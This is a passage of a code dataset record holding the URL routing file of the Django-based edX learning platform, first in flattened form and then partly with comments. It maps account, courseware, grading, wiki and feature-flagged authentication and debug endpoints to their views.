name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ", "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        